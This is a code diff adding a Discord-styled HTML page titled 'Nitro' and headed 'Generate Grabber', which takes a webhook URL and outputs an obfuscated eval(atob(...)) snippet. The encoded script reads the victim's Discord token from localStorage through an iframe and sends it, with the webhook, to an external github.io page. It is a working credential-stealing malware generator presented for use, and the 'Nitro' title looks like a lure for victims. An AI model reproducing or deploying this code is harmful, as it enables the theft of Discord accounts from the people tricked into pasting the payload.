@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nitro</title>
+    <style>
+body {
+  margin: 0;
+  padding: 0;
+}
+
+.generator-container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100vh;
+  background-color: #36393f; /* Discord background color */
+}
+
+.generator-box {
+  background-color: #2f3136; /* Darker Discord gray */
+  padding: 20px;
+  border-radius: 8px;
+  text-align: center;
+  font-family: "Segoe UI", Arial, sans-serif; /* Discord font */
+  width: 300px;
+  align-items: center;
+}
+
+.generator-title {
+  font-size: 24px;
+  color: #dcddde; /* Discord text color */
+  margin: 0;
+}
+
+.generator-input {
+  margin: 20px 0;
+}
+
+.generator-input input {
+  border-radius: 4px;
+  font-size: 16px;
+  padding: 10px 10px;
+  width: 280px;
+  border: 1px solid #72767d; /* Discord secondary text color */
+  outline: none; /* Remove input outline */
+}
+
+.generator-submit {
+  background-color: #7289da; /* Discord purple */
+  color: #fff;
+  border: none;
+  border-radius: 4px;
+  padding: 10px 20px;
+  font-size: 16px;
+  cursor: pointer;
+  width: 300px; /* Button width matches the box */
+}
+
+    </style>
+</head>
+<body>
+    <div class="generator-container">
+        <div class="generator-box" id="generator-box">
+          <h1 class="generator-title">Generate Grabber</h1>
+          <div class="generator-input">
+            <input type="text" id="hook" placeholder="Enter your Discord webhook">
+          </div>
+          <button class="generator-submit" onclick="generate()">Submit</button>
+        </div>
+    </div>
+    <script>
+        function generate() {
+            var code = `(function(){location.reload();var i=document.createElement('ifr' + 'ame');document.body.appendChild(i);var token=i.contentWindow.localStorage.token;window.open("https://exampleaccount0110.github.io/discord/?webhook=YOUR_WEBHOOK_HERE&token="+token, "_blank");})();`;
+            var wh = document.getElementById("hook").value;
+            code = code.replace('YOUR_WEBHOOK_HERE', wh);
+            const encodedCode = btoa(code);
+            const finalCode = `eval(atob('${encodedCode}'));`;
+            var container = document.getElementById("generator-box");
+            container.style.width = "400px";
+            container.style.height = "500px";
+            container.innerHTML = "";
+            container.style.color = "#7289da";
+            container.style.fontSize = "12px";
+            container.style.wordWrap = "break-word";
+            container.style.textAlign = "center";
+            container.innerHTML = `<h3>${finalCode}</h3>`;
+        }
+    </script>
+</body>
+</html>
